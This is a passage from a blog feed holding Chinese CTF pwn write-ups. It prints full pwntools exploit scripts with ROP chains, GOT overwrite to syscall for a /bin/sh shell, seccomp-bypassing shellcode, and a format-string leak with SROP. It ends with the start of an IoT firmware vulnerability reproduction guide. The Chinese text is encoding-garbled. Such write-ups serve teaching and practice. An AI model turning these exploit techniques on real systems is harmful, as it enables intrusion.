csu1        = <span class="number">0x4013CA</span></span><br><span class="line">    csu2        = <span class="number">0x4013B0</span></span><br><span class="line"></span><br><span class="line">    s( <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span> + p64(vuln))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#bss_addr : &quot;flag&quot;</span></span><br><span class="line">    payload = cyclic(<span class="number">0x28</span>) + p64(prdi) + p64(<span class="number">0</span>) + p64(prsi_r15) + p64(flag) + p64(<span class="number">0</span>) + p64(read_plt) + p64(vuln) </span><br><span class="line">    sl(payload)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#setvbuf_got--&gt;syscall</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    payload  = cyclic(<span class="number">0x28</span>) + p64(prdi) + p64(<span class="number">0</span>) + p64(prsi_r15) + p64(setvbuf_got) + p64(<span class="number">0</span>) + p64(read_plt)  <span class="comment">#æ”¹setvbufä¸ºsyscall</span></span><br><span class="line">    payload += p64(prsi_r15) + p64(flag+<span class="number">0x100</span>)+p64(<span class="number">0</span>)+p64(read_plt)     <span class="comment">#é€šè¿‡readè¾“å…¥é•¿åº¦è°ƒæ•´raxï¼Œé…åˆcsuå®ç°execve(&quot;/bin/sh\x00&quot;, 0, 0)</span></span><br><span class="line">    payload += csu(flag, <span class="number">0</span>, <span class="number">0</span>, setvbuf_got)</span><br><span class="line"></span><br><span class="line">    s(payload)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    s(p8(<span class="number">0x34</span>))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3b</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    itr()</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯æ”¹åˆ«çš„å‡½æ•°çš„è¯ä¼šæœ‰äº›éº»çƒ¦ï¼Œä¾‹å¦‚putsï¼Œä½ä¸€å­—èŠ‚å˜åŒ–èŒƒå›´å†…ï¼Œlibcé‡Œæ˜¯æ²¡æœ‰syscallæŒ‡ä»¤çš„ï¼Œéœ€è¦çˆ†ç ´ä½äºŒå­—èŠ‚é«˜ä½ï¼Œä¹Ÿå°±æ˜¯åå…­åˆ†ä¹‹ä¸€çš„æ¦‚ç‡</p><p>å¦‚æœæ˜¯randæˆ–è€…srandï¼Œå› ä¸ºå­˜åœ¨å»¶è¿Ÿç»‘å®šï¼Œgotè¡¨è¿˜æ²¡æœ‰è·Ÿlibcä¸­çš„å‡½æ•°åœ°å€ç›¸å…³è”ï¼Œéœ€è¦è°ƒç”¨ä¸€æ¬¡ï¼Œé‚£ä¹ˆéœ€è¦åœ¨æ”¹gotå‰æ‰§è¡Œä¸€æ¬¡extend()å‡½æ•°æ‰èƒ½æ”¹å®ƒä»¬çš„gotè¡¨åœ°å€</p><p>æ€»çš„è¯´è¿™ä½å¸ˆå‚…çš„wpå·²ç»æ˜¯æç®€çš„äº†ã€‚</p><h2 id="Shuffled-Execution"><a href="#Shuffled-Execution" class="headerlink" title="Shuffled_Execution"></a>Shuffled_Execution<a id="Shuffled_Execution"></a></h2><p>libcï¼š2.35-0ubuntu3.8_amd64</p><p>å…ˆç”¨\x00å¼€å¤´çš„shellcodeç»•è¿‡shuffle()çš„åŠ å¯†</p><p>shellcodeç»•æ²™ç›’çš„é¢˜ç›®ï¼Œæ²¡ä»€ä¹ˆå¤ªå¤šå¥½è®²çš„ï¼Œä¸»è¦æ˜¯å¯¹orwçš„æ›¿æ¢</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071529824.png" alt="image-20240707152951757"></p><blockquote><p>ä¸€äº›orwæƒ¯ç”¨æ–¹æ³•ï¼š</p><p>1.å‡½æ•°æ›¿æ¢ï¼š cat &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu&#x2F;asm&#x2F;unistd_64.h | grep xxx</p><blockquote><p>open  openat  openat2 â€¦â€¦</p><p>read  readv  preadv  pread64    <strong>mmap</strong> preadv2 â€¦â€¦</p><p>write  writev pwritev â€¦â€¦</p></blockquote><p>2.åˆ©ç”¨4å­—èŠ‚ç³»ç»Ÿè°ƒç”¨å·ç»•è¿‡</p><p>ä½¿ç”¨seccomp-toolsï¼Œå¦‚æœæ²¡æœ‰åˆ¤æ–­sys_number &gt;&#x3D; 0x40000000ï¼ˆä¸å­˜åœ¨<strong>A !&#x3D; ARCH_X86_64</strong>ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨<strong>0x40000000|sys_number</strong> æ¥ç»•è¿‡</p><p>3.ä¾§ä¿¡é“çˆ†ç ´</p><p>writeç›¸å…³å‡½æ•°æ— æ³•ä½¿ç”¨ï¼Œéœ€è¦åˆ©ç”¨ä¾§ä¿¡é“æ¥çˆ†ç ´flag</p><p>ä¹Ÿä¼šä½¿ç”¨mprotectæ¥è¾…åŠ©orwçš„ä½¿ç”¨</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from ctypes import *</span></span><br><span class="line"><span class="comment"># import ctypes</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;8.147.135.233 41323&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./Shuffled_Execution&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line">    <span class="comment"># debug(&#x27;b *$rebase(0x1560)&#x27;)  #x/10i 0x1337000</span></span><br><span class="line">    shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        add al, al</span></span><br><span class="line"><span class="string">        mov rsp, rax</span></span><br><span class="line"><span class="string">        add rsp, 0x500</span></span><br><span class="line"><span class="string">        mov r12, 0x67616c66   </span></span><br><span class="line"><span class="string">        push r12</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        mov rdi, -100</span></span><br><span class="line"><span class="string">        mov rdx, 0</span></span><br><span class="line"><span class="string">        mov rax, 257</span></span><br><span class="line"><span class="string">        syscall        </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rdi, 0x10000</span></span><br><span class="line"><span class="string">        mov rsi, 0x100</span></span><br><span class="line"><span class="string">        mov rdx, 1</span></span><br><span class="line"><span class="string">        mov rcx, 2</span></span><br><span class="line"><span class="string">        mov r8, rax</span></span><br><span class="line"><span class="string">        mov r10, 2</span></span><br><span class="line"><span class="string">        mov rax, 9</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rdi, 0x1</span></span><br><span class="line"><span class="string">        mov rdx, 0x1</span></span><br><span class="line"><span class="string">        push 0x100</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        mov rax,0x14</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">    s(shellcode)</span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Save-the-preceniss"><a href="#Save-the-preceniss" class="headerlink" title="Save the preceniss"></a>Save the preceniss<a id="Save_the_preceniss"></a></h2><h3 id="ä¸å¯èƒ½çš„çˆ†ç ´"><a href="#ä¸å¯èƒ½çš„çˆ†ç ´" class="headerlink" title="ä¸å¯èƒ½çš„çˆ†ç ´"></a>ä¸å¯èƒ½çš„çˆ†ç ´<a id="fail"></a></h3><p>è¿™é¢˜æ²¡å‡ºï¼Œè·¯èµ°æ­ªäº†ã€‚ä¸€ç›´åœ¨å°è¯•çˆ†srand(0)ï¼Œæœ¬åœ°debugå¯ä»¥å‡ºï¼Œç†è®ºå¯è¡Œã€‚ã€‚ã€‚</p><p>è®°æ··äº†ï¼Œå››å­—èŠ‚çˆ†ç ´16^8ï¼Œæ¦‚ç‡å¤ªä½äº†</p><p>æœ¬åœ°è°ƒé€š</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071611991.png" alt="image-20240707161117801"></p><p>openat+SROPè°ƒç”¨mmap + writeï¼Œå› ä¸ºçˆ†ä¸å‡ºæ¥æ‰€ä»¥å°±ä¸å¤šå†™äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;8.147.128.54 44681&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./SavethePrincess&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    cdll = cdll.LoadLibrary(libc_name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = init(pwnfile, IPort, libc_name)</span><br><span class="line">            passwd = <span class="string">b&#x27;nwlrbbmq\x00&#x27;</span>   <span class="comment">#--&gt; srand(0)</span></span><br><span class="line">            <span class="comment">#leak_base</span></span><br><span class="line">            sla(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">            <span class="comment"># debug(&#x27;set &#123;char[8]&#125; $rebase(0x04050) = &quot;nwlrbbmq&quot;\n \</span></span><br><span class="line">            <span class="comment">#       tele $rebase(0x04050) \n \</span></span><br><span class="line">            <span class="comment">#       b *$rebase(0x016c5)&#x27;)</span></span><br><span class="line">            sla(<span class="string">b&#x27;please input your password: \n&#x27;</span>, <span class="string">b&#x27;AAA&#x27;</span>)</span><br><span class="line">            ru(<span class="string">b&#x27;AAA&#x27;</span>)</span><br><span class="line">            base = u64(r(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) + <span class="number">0x356</span></span><br><span class="line">            bss  = base + <span class="number">0x4080</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">#leak_canary&amp;libc_base</span></span><br><span class="line">            sla(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">            <span class="comment"># pause()</span></span><br><span class="line">            sla(<span class="string">b&#x27;please input your password: \n&#x27;</span>, passwd)</span><br><span class="line">            io.recvline()</span><br><span class="line">            info = io.recvline(timeout=<span class="number">0.2</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;info = &quot;</span>, info)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> info.startswith(<span class="string">b&quot;,nononno&quot;</span>):</span><br><span class="line">                <span class="comment"># io.recvuntil(b&#x27;successfully, Embrace the power!!!\n&#x27;)</span></span><br><span class="line">                sl(<span class="string">b&#x27;%9$p-%10$p-%35$p&#x27;</span>)</span><br><span class="line">                io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">                canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">                ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">                stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">                ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">                libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29e40</span></span><br><span class="line">                leak(<span class="string">&quot;canary&quot;</span>, canary)</span><br><span class="line">                leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">                leak(<span class="string">&quot;stack&quot;</span>, stack)</span><br><span class="line"></span><br><span class="line">                prax = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">                prdi = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">                prcx = libc_base + <span class="number">0x000000000003d1ee</span></span><br><span class="line">                prsi = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">                pr8 = libc_base + <span class="number">0x00000000001659e6</span></span><br><span class="line">                pr10 = libc_base + <span class="number">0x0000000000053b00</span></span><br><span class="line">                prdx__r12 = libc_base + <span class="number">0x000000000011f2e7</span></span><br><span class="line">                syscall = libc_base + <span class="number">0x0000000000091316</span></span><br><span class="line">                pat = libc_base + <span class="number">0x0000000000114534</span></span><br><span class="line">                pr12 = libc_base + <span class="number">0x0000000000035731</span></span><br><span class="line">                push_r12_eax1 = libc_base + <span class="number">0x0000000000165a06</span></span><br><span class="line"></span><br><span class="line">                flag_addr = stack - <span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">                sla(<span class="string">b&#x27;&gt; \n&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">                openat  = p64(prdi) + p64(<span class="number">0xffffffffffffff9c</span>) + p64(prsi) + p64(flag_addr) + p64(prdx__r12) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(prax) + p64(<span class="number">257</span>) + p64(syscall)</span><br><span class="line">                write = p64(prdi) + p64(<span class="number">1</span>) + p64(prsi) + p64(libc_base + <span class="number">0x262000</span>) + p64(prdx__r12) + p64(<span class="number">0x20</span>)*<span class="number">2</span> + p64(prax) + p64(<span class="number">1</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">                frame_mmap = SigreturnFrame()</span><br><span class="line">                frame_mmap.rdi = flag_addr + <span class="number">8</span></span><br><span class="line">                frame_mmap.rsi = <span class="number">0x20</span></span><br><span class="line">                frame_mmap.rdx = <span class="number">1</span></span><br><span class="line">                frame_mmap.r8  = <span class="number">3</span></span><br><span class="line">                frame_mmap.r9  = <span class="number">0</span></span><br><span class="line">                frame_mmap.r10 = <span class="number">2</span></span><br><span class="line">                frame_mmap.rax = <span class="number">9</span></span><br><span class="line">                frame_mmap.rip = syscall</span><br><span class="line">                frame_mmap.rsp = flag_addr + <span class="number">0x60</span> + <span class="built_in">len</span>(openat) + <span class="built_in">len</span>(frame_mmap)</span><br><span class="line"></span><br><span class="line">                payload  = <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span> + p64(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + openat </span><br><span class="line">                payload += p64(prax) + p64(<span class="number">0xf</span>) + p64(syscall) + flat(frame_mmap)</span><br><span class="line">                payload += write</span><br><span class="line"></span><br><span class="line">                sla(<span class="string">b&#x27;Attack the dragon!!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># leak(&quot;base&quot;, base)</span></span><br><span class="line">                ru(<span class="string">b&#x27;Did you succeed?\n&#x27;</span>)</span><br><span class="line">                info = io.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> info.startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    log.success(<span class="string">&quot;u win!!!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;flag is &quot;</span>, info)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>psï¼šsyscall retæŒ‡ä»¤çš„å¯»æ‰¾ï¼šROPgadget â€“multibr â€“binary&#x3D;&#x2F;root&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.35-0ubuntu3.8_amd64&#x2F;libc.so.6 | grep â€œsyscallâ€</p><p>pythonä½ç‰ˆæœ¬ä¸­çš„ctypesåº“åœ¨åŠ è½½é«˜ç‰ˆæœ¬çš„libc.soæ–‡ä»¶æ—¶ä¼šåŠ è½½å¤±è´¥ï¼Œéœ€è¦ä½¿ç”¨é«˜ç‰ˆæœ¬python(python3.8åŠ è½½libc2.35å¤±è´¥)</p><h3 id="æ­£ç¡®è§£æ³•"><a href="#æ­£ç¡®è§£æ³•" class="headerlink" title="æ­£ç¡®è§£æ³•"></a>æ­£ç¡®è§£æ³•<a id="success"></a></h3><p><a href="https://www.cnblogs.com/imarch22/p/18288087#stdout">lmarch2</a>å¸ˆå‚…æœ‰å†™</p><p>è‡ªå·±å¤ªç²—å¿ƒäº†ï¼Œæ²¡è§‚å¯Ÿåˆ°æ ˆä¿¡æ¯ï¼Œç›´æ¥æƒ³ç€ç”¨&#x2F;dev&#x2F;urandomçš„ç»•è¿‡äº†ã€‚é€šè¿‡çˆ†ç ´loveå­—ç¬¦ä¸²ï¼Œè¾“å…¥bufé•¿åº¦ä¸º0xaå¸¦å‡ºå¾ªç¯æ¬¡æ•°iï¼Œé€šè¿‡åˆ¤æ–­iä½ç½®æ¥åˆ¤æ–­passwdå­—æ®µæ˜¯å¦æ­£ç¡®</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071622115.png" alt="image-20240707162258071"></p><p>expå°±ä¸è´´äº†ã€‚</p><p>æš‘å‡çš„ç¬¬ä¸€åœºæ¯”èµ›ï¼Œç®—æ˜¯å°½å¿ƒå°½åŠ›äº†ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2024æ˜¥ç§‹æ¯å¤å­£èµ›-pwn&quot;&gt;&lt;a href=&quot;#2024æ˜¥ç§‹æ¯å¤å­£èµ›-pwn&quot; class=&quot;headerlink&quot; title=&quot;2024æ˜¥ç§‹æ¯å¤å­£èµ›-pwn&quot;&gt;&lt;/a&gt;2024æ˜¥ç§‹æ¯å¤å­£èµ›-pwn&lt;/h1&gt;&lt;p&gt;awdpæ²¡çœ‹ï¼Œctfåªåšå‡ºæ¥ä¸¤é¢˜ï¼Œè¿˜æœ‰ä¸€é¢˜ç†</summary>
      
    
    
    
    <category term="WriteUP" scheme="http://tw11ty.github.io/categories/WriteUP/"/>
    
    
    <category term="writewp" scheme="http://tw11ty.github.io/tags/writewp/"/>
    
  </entry>
  
  <entry>
    <title>Iot-vulhubå¤ç°</title>
    <link href="http://tw11ty.github.io/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/"/>
    <id>http://tw11ty.github.io/2024/06/25/Iot-vulhub%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-06-25T10:46:14.000Z</published>
    <updated>2024-11-16T08:37:42.477Z</updated>
    
    <content type="html"><![CDATA[<p>å€Ÿç€é€†å‘è¯¾çš„ä½œä¸šï¼Œå°±å€Ÿæ­¤æœºä¼šæ¥ç®€å•å­¦ä¹ å¹¶å¤ç°iotå›ºä»¶æ¼æ´ã€‚ç½‘ä¸Šæœé›†èµ„æ–™æ‰¾åˆ°äº†<a href="https://github.com/Vu1nT0tal/IoT-vulhub">Vu1nT0tal&#x2F;IoT-vulhub: IoTå›ºä»¶æ¼æ´å¤ç°ç¯å¢ƒ (github.com)</a>ï¼Œæ„Ÿè§‰è¯¥é¡¹ç›®å¯¹0åŸºç¡€å…¥é—¨iotå›ºä»¶æ¼æ´å¤ç°æ˜¯è›®æœ‰å¸®åŠ©çš„ï¼Œå°±ä»¥æ­¤å¯¹ç›¸å…³æ¼æ´è¿›è¡Œå¤ç°ã€‚</p><p>ç”±äºæˆ‘çš„æœåŠ¡å™¨æ˜¯å›½å†…çš„ï¼Œæ‰€ä»¥æ„å»ºè¿‡ç¨‹ä¼šæœ‰å¾ˆå¤šéº»çƒ¦ï¼Œè€Œä¸”dockerhubä¹Ÿgäº†â€¦â€¦</p><h1 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h1><p>- <a href="#env">ç¯å¢ƒæ„å»º</a></p><ul><li><a href="#env_basic">åŸºç¡€ç¯å¢ƒæ„å»º</a></li><li><a href="#env_vul">æ¼æ´ç¯å¢ƒæ„å»º</a></li></ul><p>- <a href="#TOTOLINK">TOTOLINK NR1800X (CVE-2022-41518)</a></p><p>- <a href="#VIVOTEK">Vivotek CC8160 æ ˆæº¢å‡ºæ¼æ´</a></p><p>- <a href="#HG532">åä¸º HG532 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-17215ï¼‰</a></p><p>- <a href="#CISCO">Cisco RV110W è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2020-3331ï¼‰</a></p><p>- <a href="#DLINK">D-Link DIR-859 å‘½ä»¤æ³¨å…¥æ¼æ´ï¼ˆCVE-2019-17621ï¼‰</a></p><ul><li><a href="#LOCAL">æœ¬åœ°ä»¿çœŸç¯å¢ƒæ­å»º</a><ul><li><a href="#binwalk">binwelk å›ºä»¶è§£åŒ…å·¥å…·</a></li><li><a href="#qemu">qemu</a></li><li><a href="#firmadyne">Firmadyne å›ºä»¶ä»¿çœŸå·¥å…·</a></li><li><a href="#action">æ¨¡æ‹Ÿè¿è¡Œå›ºä»¶</a></li></ul></li></ul><h1 id="ç¯å¢ƒæ„å»º"><a href="#ç¯å¢ƒæ„å»º" class="headerlink" title="ç¯å¢ƒæ„å»º "></a>ç¯å¢ƒæ„å»º <a id="env"></a></h1><p><a href="https://wsxk.github.io/IotVulhub/">IoT-vulhub æ¼æ´å¤ç° â€“ wsxkâ€™s blog â€“ å°èœé¸¡</a></p><p><a href="https://brvc3.github.io/2023/03/15/IoT-Vulhub%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">IoT-VulhubåŸºç¡€ç¯å¢ƒæ­å»º | Brvc3â€™s Base</a></p><p>dockeræ‹‰å–é—®é¢˜è§£å†³ï¼š<a href="https://github.com/DaoCloud/public-image-mirror?tab=readme-ov-file">https://github.com/DaoCloud/public-image-mirror?tab=readme-ov-file</a></p><h2 id="åŸºç¡€ç¯å¢ƒæ„å»º"><a href="#åŸºç¡€ç¯å¢ƒæ„å»º" class="headerlink" title="åŸºç¡€ç¯å¢ƒæ„å»º"></a>åŸºç¡€ç¯å¢ƒæ„å»º<a id="env_basic"></a></h2><p> æ„å»º ubuntu1604 åŸºç¡€é•œåƒ</p><blockquote><p>cd baseImage&#x2F;ubuntu1604 &amp;&amp; docker build -t firmianay&#x2F;ubuntu1604 .</p></blockquote><p> æ„å»º binwalk å®¹å™¨</p><blockquote><p>cd baseImage&#x2F;binwalk &amp;&amp; docker build -t firmianay&#x2F;binwalk .</p></blockquote><h2 id="æ¼æ´ç¯å¢ƒæ„å»º"><a href="#æ¼æ´ç¯å¢ƒæ„å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒæ„å»º"></a>æ¼æ´ç¯å¢ƒæ„å»º<a id="env_vul"></a></h2><p>åˆå§‹åŒ–ç¯å¢ƒï¼ˆarm&#x2F;mips&#x2F;mipselï¼‰</p><blockquote><p>.&#x2F;init_env.sh xxxx</p></blockquote><p>è‡ªåŠ¨åŒ–ç¼–è¯‘ç¯å¢ƒï¼Œçœ‹æœ‰ä»€ä¹ˆdocker-composeå°±çŸ¥é“æ”¯æŒä»€ä¹ˆäº†</p><blockquote><p>docker-compose -f docker-compose-user.yml build         # QEMU ç”¨æˆ·æ¨¡å¼æ¨¡æ‹Ÿ</p><p>docker-compose -f docker-compose-system.yml build       # QEMU ç³»ç»Ÿæ¨¡å¼æ¨¡æ‹Ÿ</p><p>docker-compose -f docker-compose-firmadyne.yml build    # firmadyne æ¨¡æ‹Ÿ</p><p>docker-compose -f docker-compose-firmae.yml build       # firmae æ¨¡æ‹Ÿï¼ˆæ–¹ä¾¿è°ƒè¯•ï¼‰</p></blockquote><p>å¯åŠ¨ç¯å¢ƒ</p><blockquote><p>docker-compose -f docker-compose-xxxx.yml up</p></blockquote><p>åˆ é™¤ç¯å¢ƒ</p><blockquote><p>docker-compose -f docker-compose-xxxx.yml down -v</p></blockquote><h1 id="TOTOLINK-NR1800X-CVE-2022-41518"><a href="#TOTOLINK-NR1800X-CVE-2022-41518" class="headerlink" title="TOTOLINK NR1800X (CVE-2022-41518)"></a>TOTOLINK NR1800X (CVE-2022-41518)<a id="TOTOLINK"></a></h1><p><a href="https://paper.seebug.org/1995/">TOTOLINK NR1800X ç³»åˆ— CVE åˆ†æ (seebug.org)</a></p><h2 id="æ¼æ´ç¯å¢ƒ"><a href="#æ¼æ´ç¯å¢ƒ" class="headerlink" title="æ¼æ´ç¯å¢ƒ"></a>æ¼æ´ç¯å¢ƒ</h2><ul><li>dockerï¼šæ”»å‡»ã€è°ƒè¯•ä¸»æœºï¼š192.168.2.1</li><li>qemu-systemï¼šå›ºä»¶ä¸»æœºï¼š192.168.2.2</li><li>é•œåƒä¾èµ–ï¼š<code>firmianay/ubuntu1604 -&gt; 